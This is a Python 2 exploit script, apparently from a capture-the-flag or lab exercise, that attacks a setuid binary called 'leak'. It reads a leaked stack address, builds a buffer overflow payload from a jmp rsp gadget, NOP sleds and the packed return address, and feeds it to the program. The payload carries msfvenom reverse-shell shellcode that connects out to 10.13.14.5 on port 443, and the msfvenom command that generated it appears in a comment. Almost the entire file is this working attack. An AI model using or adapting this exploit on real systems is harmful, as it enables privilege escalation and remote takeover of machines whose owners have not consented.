#!/usr/bin/env python

import subprocess
import os
from struct import *

"""
x.py
chris.downs[at]reticulipictures.com

uname -a ; ls -l leak ; file leak
Linux xxxxxxxx 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
-rwsr-xr-x 1 alex alex 9112 Dec 12  2017 leak
leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
"""

# popen ./leak --
p = subprocess.Popen(['/home/leak'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
o = os.read(p.stdout.fileno(), 100)
print o

# split input --
off = o.split(" ")[3].split("\n")[0]
hex_str = off
hex_int = int(hex_str, 16)

# ret --
# x $rsp
# 0x7fffffffcf98:   rex.WB
# b = "\x98\xcf\xff\xff\xff\x7f\x00\x00"
# some fucking how this works ??
b = ""
b += "\xff\xe4"

# nop sled --
# pattern_search
# [RSP] --> offset 72 - size ~203
b += "\x90"*70

# pack unsigned long int --
# https://docs.python.org/3/library/struct.html
b += pack("<Q", hex_int)

# padding --
b += "\x90"*100

# buf shellcode --
# sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.14.5 LPORT=443 -b '\x00\x0a\x0d' -f python -v b
b += "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef"
b += "\xff\xff\xff\x48\xbb\xd0\x37\x45\x44\x2e\xbb\xa0\x71\x48"
b += "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xba\x1e\x1d"
b += "\xdd\x44\xb9\xff\x1b\xd1\x69\x4a\x41\x66\x2c\xe8\xc8\xd2"
b += "\x37\x44\xff\x24\xb6\xae\x74\x81\x7f\xcc\xa2\x44\xab\xfa"
b += "\x1b\xfa\x6f\x4a\x41\x44\xb8\xfe\x39\x2f\xf9\x2f\x65\x76"
b += "\xb4\xa5\x04\x26\x5d\x7e\x1c\xb7\xf3\x1b\x5e\xb2\x5e\x2b"
b += "\x6b\x5d\xd3\xa0\x22\x98\xbe\xa2\x16\x79\xf3\x29\x97\xdf"
b += "\x32\x45\x44\x2e\xbb\xa0\x71"

# nop sled pad --
b += "A"*42

# exec --
p.stdin.write(b)
p.stdin.flush()
p.stdin.write(b)
p.stdin.flush()
p.wait()

"""

__EOF___
"""
